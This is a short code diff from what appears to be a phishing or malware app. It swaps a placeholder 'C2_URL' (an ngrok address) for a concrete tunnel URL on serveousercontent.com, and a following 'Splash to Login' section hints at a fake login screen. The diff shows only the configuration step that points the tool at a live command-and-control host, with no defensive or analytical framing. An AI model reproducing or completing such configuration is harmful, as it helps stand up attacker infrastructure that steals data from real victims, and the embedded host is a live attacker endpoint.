@@ -1,5 +1,5 @@
 // ============ Configuration ============
-const C2_URL = 'https://your-ngrok-url.ngrok.io';
+const C2_URL = 'https://c96a7085c76d2901-105-113-98-165.serveousercontent.com';
 
 // ============ Splash to Login ============
 setTimeout(() => {
